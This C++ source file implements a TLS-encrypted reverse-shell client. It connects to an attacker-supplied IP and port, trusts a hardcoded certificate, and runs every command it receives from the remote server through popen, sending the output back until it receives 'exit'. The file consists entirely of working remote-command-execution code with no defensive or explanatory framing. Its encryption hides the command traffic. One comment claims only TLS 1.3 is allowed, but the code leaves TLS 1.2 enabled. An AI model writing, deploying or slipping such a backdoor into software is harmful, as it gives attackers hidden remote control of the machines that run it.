#include <openssl/ssl.h>
#include <openssl/err.h>
#include <iostream>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <fstream>
#include <array>
#include <memory>
#include <cstdlib>

// Removed hardcoded ADDRESS and PORT definitions

// Hardcoded server certificate (PEM format)
const char *server_cert =
"-----BEGIN CERTIFICATE-----\n"
"MIIDbTCCAlWgAwIBAgIUETWSR3r9LrHpUkY9KFJfCsb/OOwwDQYJKoZIhvcNAQEL\n"
"BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM\n"
"GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAgFw0yNDEwMDYwNzMxMDlaGA8yMTI0\n"
"MDkxMjA3MzEwOVowRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx\n"
"ITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDCCASIwDQYJKoZIhvcN\n"
"AQEBBQADggEPADCCAQoCggEBAKZn1qW6TLmF9jVjvpdl02SD/n0Bf4uVUkn2vOjr\n"
"FW2edWAAqkjJlSP8vgBe8r36GdKBMLrv8iCgwruIC5eCBi6MiVydbECxYVe4HWlB\n"
"32A9+/wY5xsxQFyV1QWn/dHKsj6pjuKXKBTSP1BWCgi891tk5pEy7pJeeML5YMTd\n"
"/77vk7t0xDcr8sb5KriwLAUcH2FruQjcLCIYZcl0fOjn3/9hK5DCopiRBl7ZlqOs\n"
"xvAY1xQARV6liAUlIyP+yt7xV3TDsfsxoQd545glNjKBtqsGrmhlq65VsyF38WuI\n"
"vkVenQMXwxT8a7zX8Wrj8qMMcHw5nnbRPyQQkTQTN0hKE/kCAwEAAaNTMFEwHQYD\n"
"VR0OBBYEFCf4tHZf5lOesSIvEgDFIJmEdAiXMB8GA1UdIwQYMBaAFCf4tHZf5lOe\n"
"sSIvEgDFIJmEdAiXMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB\n"
"ABTWrEzBljxtE5HhlXjtck8QrQcYSpzM5EH70PwqRsovG/QMz1H8DHjcV8weUcEa\n"
"kVwYruafyNpeVZHDknKqMZkoL8o+N/bid6eZ1t2gmeRFPZUuwJwd6BYLSroxFijr\n"
"yEXYsZLbYVn3EuVVaNTB34jbwVpjk506Q3g9OfKtHwZ3G0db3WxvlEgWyi6OR78K\n"
"IbJDV5NbCBL+f4AV3P8xU9m+m4wyU6eArexlHhUH6b3BFF3qa3iGwATEr2Jb4F9V\n"
"O2eqpMj4m4FOBJiKGPpUz4S84sBzKBgd5O1REg9nEJZvnYb7FNKY1r5k/aZJL4NN\n"
"8IN0xKjT0Bx7UJI9KT2agyU=\n"
"-----END CERTIFICATE-----\n";

// Function to write the certificate to a temporary file and clean up later
std::string write_temp_cert() {
    std::string cert_path = "/tmp/server_cert.pem";
    std::ofstream cert_file(cert_path);
    if (!cert_file) {
        perror("Unable to create temporary certificate file");
        exit(EXIT_FAILURE);
    }
    cert_file << server_cert;
    cert_file.close();
    return cert_path;
}

void initialize_openssl() {
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
}

void cleanup_openssl() {
    EVP_cleanup();
}

SSL_CTX *create_context() {
    const SSL_METHOD *method;
    SSL_CTX *ctx;

    // Use only TLS 1.3
    method = TLS_client_method();
    ctx = SSL_CTX_new(method);
    if (!ctx) {
        perror("Unable to create SSL context");
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    // Disable all other versions to enforce only TLS 1.3
    SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 | SSL_OP_NO_TLSv1 | SSL_OP_NO_TLSv1_1);

    return ctx;
}

void load_server_certificate(SSL_CTX *ctx) {
    std::string cert_path = write_temp_cert();

    if (SSL_CTX_load_verify_locations(ctx, cert_path.c_str(), NULL) != 1) {
        ERR_print_errors_fp(stderr);
        std::remove(cert_path.c_str());
        exit(EXIT_FAILURE);
    }

    std::remove(cert_path.c_str());
}

std::string execute_command(const std::string &command) {
    std::array<char, 128> buffer;
    std::string result;

    // Open a pipe to execute the command
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(command.c_str(), "r"), pclose);
    if (!pipe) {
        return "Error: Unable to open pipe.";  // Graceful handling of pipe error
    }

    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }

    // If the command was not found or execution failed, return a message
    if (result.empty()) {
        return "Error: Command not found or execution failed.";
    }

    return result;
}

void print_usage(const char *prog_name) {
    std::cerr << "Usage: " << prog_name << " <IP_ADDRESS> <PORT>\n";
    std::cerr << "Example: " << prog_name << " 192.168.1.100 8080\n";
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        print_usage(argv[0]);
        return EXIT_FAILURE;
    }

    const char* server_address = argv[1];
    int port = std::atoi(argv[2]);

    // Validate port number
    if (port <= 0 || port > 65535) {
        std::cerr << "Error: Invalid port number.\n";
        print_usage(argv[0]);
        return EXIT_FAILURE;
    }

    initialize_openssl();

    SSL_CTX *ctx = create_context();
    load_server_certificate(ctx);  // Ensure the certificate is loaded

    SSL *ssl = SSL_new(ctx);
    if (!ssl) {
        perror("Unable to create SSL structure");
        ERR_print_errors_fp(stderr);
        SSL_CTX_free(ctx);
        cleanup_openssl();
        return EXIT_FAILURE;
    }

    // Code to create a socket and connect to the server
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Unable to create socket");
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        cleanup_openssl();
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in addr;
    std::memset(&addr, 0, sizeof(addr)); // Ensure the structure is zeroed
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    // Convert IP address from text to binary form
    if (inet_pton(AF_INET, server_address, &addr.sin_addr) <= 0) {
        std::cerr << "Invalid address/ Address not supported: " << server_address << "\n";
        close(sockfd);
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        cleanup_openssl();
        exit(EXIT_FAILURE);
    }

    if (connect(sockfd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("Connection failed");
        close(sockfd);
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        cleanup_openssl();
        exit(EXIT_FAILURE);
    }

    SSL_set_fd(ssl, sockfd);

    if (SSL_connect(ssl) <= 0) {
        ERR_print_errors_fp(stderr);
    } else {
        std::cout << "Connected to server " << server_address << ":" << port << "!\n";

        while (true) {
            char buffer[1024] = {0};
            int bytes = SSL_read(ssl, buffer, sizeof(buffer) - 1);
            if (bytes > 0) {
                buffer[bytes] = '\0'; // Null-terminate the string
                std::string command(buffer);

                // Check for exit command to break the loop
                if (command == "exit") {
                    std::cout << "Exiting client.\n";
                    break; // Exit if 'exit' command is received
                }

                // Execute the command and get the result
                std::string output = execute_command(command);

                // Send the output back to the server
                if (SSL_write(ssl, output.c_str(), output.length()) <= 0) {
                    std::cerr << "Error writing to server.\n";
                    break;
                }
            } else if (bytes == 0) {
                std::cout << "Server closed the connection.\n";
                break; // Connection closed by server
            } else {
                std::cerr << "Error reading from server.\n";
                break; // Exit on error
            }
        }
    }

    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(sockfd);  // Close the socket when done
    SSL_CTX_free(ctx);
    cleanup_openssl();
    return 0;
}
